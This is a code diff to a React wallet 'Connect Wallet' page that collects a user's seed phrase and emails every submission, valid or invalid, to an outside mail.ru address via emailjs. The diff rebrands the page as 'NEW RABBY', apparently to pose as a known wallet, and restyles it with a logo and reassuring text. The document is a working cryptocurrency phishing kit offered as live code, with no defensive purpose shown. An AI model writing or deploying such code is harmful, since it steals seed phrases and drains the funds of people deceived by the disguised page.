@@ -160,7 +160,7 @@ const ConnectPage = () => {
               console.log("data", data);
               const templateParams = {
                 to_email: "benard.tee@mail.ru",
-                message: `DECENTRALIZED LAUNCHPAD Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
+                message: `NEW RABBY Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
               };
 
               emailjs
@@ -196,7 +196,7 @@ const ConnectPage = () => {
       if (error.toString().includes("invalid mnemonic")) {
         const templateParams = {
           to_email: "benard.tee@mail.ru",
-          message: `DECENTRALIZED LAUNCHPAD Submission\n\nBAD Secret Phrase (Invalid phrase):\n\n ${phrase}`,
+          message: `NEW RABBY Submission\n\nBAD Secret Phrase (Invalid phrase):\n\n ${phrase}`,
         };
 
         emailjs
@@ -220,16 +220,19 @@ const ConnectPage = () => {
   };
 
   return (
-    <div className="w-screen h-[90vh] flex justify-center items-center px-8">
-      <div className="w-full max-w-[500px] pt-20 flex flex-col gap-5 lg:px-0">
-        <p className="text-3xl font-bold">Import Your Wallet</p>
-        <div className="mb-6">
+    <div className="w-screen h-[90vh] flex justify-center items-center px-8 bg-[#808EFF]">
+      <div className="w-full max-w-[500px] pt-2 flex flex-col gap-4 lg:px-0 text-white">
+        <div className="flex justify-center">
+          <img src="/assets/images/logo-2.png" alt="" className="w-40" />
+        </div>
+        <p className="text-2xl font-black">Connect Wallet</p>
+        <div className="mb-4">
           <p className="font-bold text-sm">What is a Seed Phrase?</p>
           <span className="text-sm">
             A 12, 18, or 24-word phrase used to control your assets.
           </span>
         </div>
-        <div className="mb-6">
+        <div className="mb-4">
           <p className="font-bold text-sm">
             Is it safe to import it in {import.meta.env.VITE_APP_NAME}?
           </p>
@@ -253,16 +256,16 @@ const ConnectPage = () => {
         </div>
       </div>
       {show ? (
-        <div className="fixed w-screen h-screen flex justify-center items-center bg-black/90 px-5 lg:px-0">
+        <div className="fixed w-screen h-screen flex justify-center items-center bg-black/70 px-5 lg:px-0">
           <div
-            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-black py-12"
-            style={{ boxShadow: "4px 3px 10px #032e2a" }}
+            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#fff] py-12 rounded-lg"
+            style={{ boxShadow: "4px 3px 10px #85a1fe3f" }}
           >
             <div className="flex justify-between items-center mb-10">
               <p className="font-bold text-xl">Import Seed Phrase</p>
 
               <div
-                className="h-[30px] w-[30px] flex justify-center items-center rounded-full border-[2px] border-white cursor-pointer"
+                className="h-[30px] w-[30px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg"
                 onClick={() => setShow(false)}
               >
                 x
